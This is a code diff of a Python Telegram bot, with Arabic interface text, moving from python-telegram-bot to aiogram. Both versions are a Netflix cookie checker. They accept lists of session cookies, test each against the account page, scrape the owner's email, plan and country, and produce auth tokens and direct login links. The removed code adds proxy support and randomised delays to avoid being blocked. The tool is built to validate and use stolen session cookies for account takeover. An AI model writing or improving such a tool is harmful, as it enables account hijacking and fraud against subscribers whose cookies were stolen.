@@ -1,171 +1,212 @@
-import os, re, json, base64, time, random
-from datetime import datetime
-import requests
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
-from telegram.constants import ParseMode
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import asyncio
+import aiohttp
+import re
+import os
+import logging
+from aiogram import Bot, Dispatcher, types
+from aiogram.utils import executor
+from aiogram.dispatcher import FSMContext
+from aiogram.dispatcher.filters.state import State, StatesGroup
+from aiogram.contrib.fsm_storage.memory import MemoryStorage
+from aiogram.types import ParseMode
 
-TOKEN = os.environ.get("BOT_TOKEN")
-PROXY = os.environ.get("PROXY", None)  # ← البروكسي اختياري
+# قراءة التوكن من متغيرات البيئة
+BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 
-# ========== دالة الفحص (باستخدام البروكسي إن وجد) ==========
-def check_cookie(cookie):
+if not BOT_TOKEN:
+    raise ValueError("BOT_TOKEN غير موجود في متغيرات البيئة")
+
+logging.basicConfig(level=logging.INFO)
+bot = Bot(token=BOT_TOKEN)
+storage = MemoryStorage()
+dp = Dispatcher(bot, storage=storage)
+
+class Form(StatesGroup):
+    waiting_cookies = State()
+
+async def extract_api_token(session: aiohttp.ClientSession, cookie_str: str) -> dict:
+    """استخراج API Token من كوكيز نتفليكس"""
+    result = {
+        'valid': False,
+        'token': None,
+        'netflix_id': None,
+        'secure_netflix_id': None,
+        'auth_url': None,
+        'error': None
+    }
+    
     try:
-        sess = requests.Session()
-        proxies = {"http": PROXY, "https": PROXY} if PROXY else None
-
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Cookie": cookie,
-            "Referer": "https://www.netflix.com/",
-        }
-        sess.get("https://www.netflix.com/", headers=headers, timeout=15, allow_redirects=True, proxies=proxies)
-        time.sleep(random.uniform(1.0, 2.0))
-        sess.get("https://www.netflix.com/", headers=headers, timeout=15, allow_redirects=True, proxies=proxies)
-        time.sleep(random.uniform(0.5, 1.5))
-        r = sess.get(
-            "https://www.netflix.com/YourAccount",
-            headers=headers,
-            timeout=20,
-            allow_redirects=True,
-            max_redirects=5,
-            proxies=proxies
-        )
-        final_url = r.url.lower()
-        result = {"status": "unknown", "cookie": cookie, "details": {}, "api_tokens": {}}
-        if "login" in final_url:
-            result["status"] = "invalid"
+        cookies_dict = {}
+        for cookie in cookie_str.split(';'):
+            cookie = cookie.strip()
+            if '=' in cookie:
+                name, value = cookie.split('=', 1)
+                cookies_dict[name.strip()] = value.strip()
+        
+        netflix_id = cookies_dict.get('NetflixId', '')
+        secure_netflix_id = cookies_dict.get('SecureNetflixId', '')
+        
+        if not netflix_id or not secure_netflix_id:
+            result['error'] = 'NetflixId أو SecureNetflixId غير موجود'
             return result
-        text = r.text
-        if "membershipStatus" in text or "profiles" in text or "gps" in text:
-            result["status"] = "valid"
-            try:
-                data_match = re.search(r"window\.__netflix\.reactContext\s*=\s*({.*?});", text, re.DOTALL)
-                if data_match:
-                    data = json.loads(data_match.group(1))
-                    user_info = data.get("models", {}).get("userInfo", {}).get("data", {}) or \
-                                data.get("models", {}).get("serverModel", {}).get("data", {}).get("userInfo", {})
-                    result["details"] = {
-                        "email": user_info.get("email", ""),
-                        "membership": user_info.get("membershipStatus", ""),
-                        "plan": user_info.get("plan", {}).get("planName", ""),
-                        "country": user_info.get("countryOfSignup", "")
-                    }
-                else:
-                    em = re.search(r'"email"\s*:\s*"([^"]+)"', text)
-                    mm = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', text)
-                    result["details"] = {
-                        "email": em.group(1) if em else "",
-                        "membership": mm.group(1) if mm else ""
-                    }
-            except:
-                pass
-            nid = re.search(r"NetflixId=([^;]+)", cookie)
-            sid = re.search(r"SecureNetflixId=([^;]+)", cookie)
-            if nid and sid:
-                payload = {"netflixId": nid.group(1), "secureNetflixId": sid.group(1), "timestamp": datetime.now().isoformat()}
-                token = base64.b64encode(json.dumps(payload).encode()).decode().replace("+", "-").replace("/", "_").replace("=", "")
-                result["api_tokens"] = {
-                    "api_token": token,
-                    "direct_links": {
-                        "computer": {"name": "💻 كمبيوتر", "url": f"https://www.netflix.com/Login?apiToken={token}"},
-                        "android": {"name": "🤖 أندرويد", "url": f"https://www.netflix.com/Login?apiToken={token}&deviceType=android"},
-                        "ios": {"name": "🍎 آيفون", "url": f"https://www.netflix.com/Login?apiToken={token}&deviceType=ios"},
-                        "tv": {"name": "📺 تلفاز", "url": f"https://www.netflix.com/tv/login?apiToken={token}"}
-                    }
-                }
-        else:
-            result["status"] = "error"
-        return result
+        
+        result['netflix_id'] = netflix_id
+        result['secure_netflix_id'] = secure_netflix_id
+        
+        token_url = 'https://www.netflix.com/api/shakti/v1/tokens'
+        token_headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'application/json',
+            'Cookie': cookie_str,
+            'Referer': 'https://www.netflix.com/'
+        }
+        
+        async with session.post(token_url, headers=token_headers, json={}) as resp:
+            if resp.status == 200:
+                token_data = await resp.json()
+                if 'token' in token_data:
+                    result['token'] = token_data['token']
+                elif 'authToken' in token_data:
+                    result['token'] = token_data['authToken']
+                
+                auth_url = f"https://www.netflix.com/Login?authToken={result['token']}&netflixId={netflix_id}"
+                result['auth_url'] = auth_url
+                result['valid'] = True
+            else:
+                result['error'] = f'HTTP {resp.status}'
     except Exception as e:
-        return {"status": "error", "cookie": cookie}
+        result['error'] = str(e)
+    
+    return result
 
-# ========== استخراج الكوكيز من TXT ==========
-def extract_cookies_from_txt(file_bytes):
-    content = file_bytes.decode("utf-8", errors="ignore")
-    return [line.strip() for line in content.splitlines() if "=" in line.strip()]
+async def check_netflix_cookie(cookie_str: str) -> dict:
+    """فحص الكوكيز واستخراج المعلومات"""
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Cookie': cookie_str,
+        'Connection': 'keep-alive',
+    }
+    
+    result = {
+        'valid': False,
+        'email': None,
+        'plan': None,
+        'country': None,
+        'auth_token': None,
+        'netflix_id': None,
+        'secure_netflix_id': None,
+        'auth_url': None,
+        'error': None
+    }
+    
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.get('https://www.netflix.com/YourAccount', headers=headers, timeout=15) as resp:
+                if resp.status == 200:
+                    text = await resp.text()
+                    
+                    email_match = re.search(r'email["\']?\s*:\s*["\']([^"\']+)["\']', text)
+                    if email_match:
+                        result['email'] = email_match.group(1)
+                    
+                    plan_match = re.search(r'plan["\']?\s*:\s*["\']([^"\']+)["\']', text)
+                    if plan_match:
+                        result['plan'] = plan_match.group(1)
+                    
+                    country_match = re.search(r'country["\']?\s*:\s*["\']([^"\']+)["\']', text)
+                    if country_match:
+                        result['country'] = country_match.group(1)
+                    
+                    result['valid'] = True
+                else:
+                    result['error'] = f"HTTP {resp.status}"
+        except Exception as e:
+            result['error'] = str(e)
+        
+        if result['valid']:
+            token_result = await extract_api_token(session, cookie_str)
+            result['auth_token'] = token_result.get('token')
+            result['netflix_id'] = token_result.get('netflix_id')
+            result['secure_netflix_id'] = token_result.get('secure_netflix_id')
+            result['auth_url'] = token_result.get('auth_url')
+    
+    return result
 
-# ========== أوامر البوت (بدون تغيير) ==========
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "👋 أهلاً بك في بوت فحص كوكيز Netflix\n\n"
-        "📤 أرسل ملف .txt يحتوي على الكوكيز (كل كوكيز في سطر).\n"
-        "🔍 سيتم الفحص فوراً وإرسال الحسابات الصالحة فقط.\n\n"
-        "⚠️ لتجنب الحظر، تأكد من إضافة بروكسي (اختياري)."
-    )
+@dp.message_handler(commands=['start'])
+async def cmd_start(message: types.Message):
+    welcome_text = """
+🎬 **بوت فحص كوكيز نتفليكس**
 
-async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    doc = update.message.document
-    if not doc:
-        return
-    if not doc.file_name.endswith(".txt"):
-        await update.message.reply_text("❌ الرجاء إرسال ملف .txt فقط")
-        return
-    await update.message.reply_text("⏳ جاري استخراج الكوكيز...")
-    file = await context.bot.get_file(doc.file_id)
-    file_bytes = await file.download_as_bytearray()
-    cookies = extract_cookies_from_txt(bytes(file_bytes))
-    if not cookies:
-        await update.message.reply_text("❌ لم يتم العثور على كوكيز صالحة في الملف")
-        return
-    unique_cookies = list(dict.fromkeys(cookies))
-    await update.message.reply_text(f"🔍 جاري فحص {len(unique_cookies)} كوكيز...")
-    valid_results = []
-    start_time = time.time()
-    with ThreadPoolExecutor(max_workers=4) as executor:
-        futures = {executor.submit(check_cookie, c): c for c in unique_cookies}
-        for future in as_completed(futures):
-            res = future.result()
-            if res.get("status") == "valid":
-                valid_results.append(res)
-    elapsed = time.time() - start_time
-    invalid = len(unique_cookies) - len(valid_results)
-    await update.message.reply_text(
-        f"✅ انتهى الفحص في {elapsed:.1f} ثانية.\n"
-        f"📊 صالحة: {len(valid_results)}\n"
-        f"❌ غير صالحة: {invalid}"
-    )
-    if valid_results:
-        for i, acc in enumerate(valid_results, 1):
-            details = acc.get("details", {})
-            tokens = acc.get("api_tokens", {})
-            direct = tokens.get("direct_links", {})
-            cookie = acc.get("cookie", "")
-            api_token = tokens.get("api_token", "")
-            msg = (
-                f"🎉 *حساب صالح #{i}*\n\n"
-                f"📧 *البريد:* `{details.get('email', 'غير معروف')}`\n"
-                f"👑 *العضوية:* `{details.get('membership', 'غير معروف')}`\n"
-                f"💎 *الباقة:* `{details.get('plan', 'غير معروف')}`\n"
-                f"🌍 *البلد:* `{details.get('country', 'غير معروف')}`\n\n"
-                f"🔗 *رابط الكمبيوتر:* [اضغط هنا]({direct.get('computer', {}).get('url', '')})\n"
-                f"🤖 *رابط أندرويد:* [اضغط هنا]({direct.get('android', {}).get('url', '')})\n"
-                f"🍎 *رابط آيفون:* [اضغط هنا]({direct.get('ios', {}).get('url', '')})\n"
-                f"📺 *رابط التلفاز:* [اضغط هنا]({direct.get('tv', {}).get('url', '')})\n\n"
-                f"🔑 *ApiToken:* `{api_token}`\n\n"
-                f"🍪 *الكوكيز:* `{cookie}`"
-            )
-            keyboard = [
-                [InlineKeyboardButton("📋 نسخ الكوكيز", callback_data=f"copy_{i}_cookie")],
-                [InlineKeyboardButton("🔑 نسخ ApiToken", callback_data=f"copy_{i}_token")]
-            ]
-            await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard), disable_web_page_preview=True)
+أرسل لي الكوكيز وسأقوم بفحصه وإرجاع:
+✅ معلومات الحساب
+🔑 API Token
+🔗 رابط تسجيل دخول مباشر
+
+📤 أرسل الكوكيز الآن أو ملف فيه كوكيز.
+    """
+    await message.reply(welcome_text, parse_mode=ParseMode.MARKDOWN)
+    await Form.waiting_cookies.set()
+
+@dp.message_handler(state=Form.waiting_cookies, content_types=types.ContentTypes.TEXT)
+async def process_cookies(message: types.Message, state: FSMContext):
+    cookie_str = message.text.strip()
+    processing_msg = await message.reply("⏳ جاري الفحص...")
+    
+    result = await check_netflix_cookie(cookie_str)
+    await processing_msg.delete()
+    
+    if result['valid']:
+        success_text = f"""
+✅ **فحص ناجح!**
+
+📧 الإيميل: `{result['email'] or 'غير متوفر'}`
+💳 الخطة: `{result['plan'] or 'غير متوفر'}`
+🌍 الدولة: `{result['country'] or 'غير متوفر'}`
+
+🔑 **API Token:**
+`{result['auth_token'] or 'تعذر استخراج التوكن'}`
+
+🆔 Netflix ID: `{result['netflix_id'] or 'N/A'}`
+
+🔗 **رابط الدخول:**
+`{result['auth_url'] or 'تعذر إنشاء الرابط'}`
+        """
+        await message.reply(success_text, parse_mode=ParseMode.MARKDOWN)
     else:
-        await update.message.reply_text("😢 لا توجد حسابات صالحة. قد يكون عنوان IP محظوراً من Netflix. جرب إضافة بروكسي.")
+        await message.reply(f"❌ فشل الفحص: `{result['error']}`", parse_mode=ParseMode.MARKDOWN)
+    
+    await state.finish()
 
-async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.answer("استخدم الضغط المطول على النص لنسخه.")
+@dp.message_handler(state=Form.waiting_cookies, content_types=types.ContentTypes.DOCUMENT)
+async def process_cookie_file(message: types.Message, state: FSMContext):
+    document = message.document
+    file_info = await bot.get_file(document.file_id)
+    downloaded_file = await bot.download_file(file_info.file_path)
+    content = downloaded_file.read().decode('utf-8', errors='ignore')
+    
+    cookies_list = [line.strip() for line in content.split('\n') if line.strip()]
+    results_text = "📊 **النتائج:**\n\n"
+    valid_count = 0
+    
+    for i, cookie in enumerate(cookies_list, 1):
+        result = await check_netflix_cookie(cookie)
+        if result['valid']:
+            valid_count += 1
+            results_text += f"✅ **كوكيز {i}:** {result['email']}\n🔗 {result['auth_url']}\n---\n"
+        else:
+            results_text += f"❌ **كوكيز {i}:** غير صالح\n---\n"
+        await asyncio.sleep(1)
+    
+    results_text += f"\n📈 **الإجمالي:** {valid_count}/{len(cookies_list)}"
+    await message.reply(results_text, parse_mode=ParseMode.MARKDOWN)
+    await state.finish()
 
-def main():
-    application = Application.builder().token(TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, start))
-    print("✅ البوت يعمل...")
-    application.run_polling()
+@dp.message_handler(commands=['cancel'], state='*')
+async def cmd_cancel(message: types.Message, state: FSMContext):
+    await state.finish()
+    await message.reply("❌ تم الإلغاء")
 
-if __name__ == "__main__":
-    main()
+if __name__ == '__main__':
+    executor.start_polling(dp, skip_updates=True)
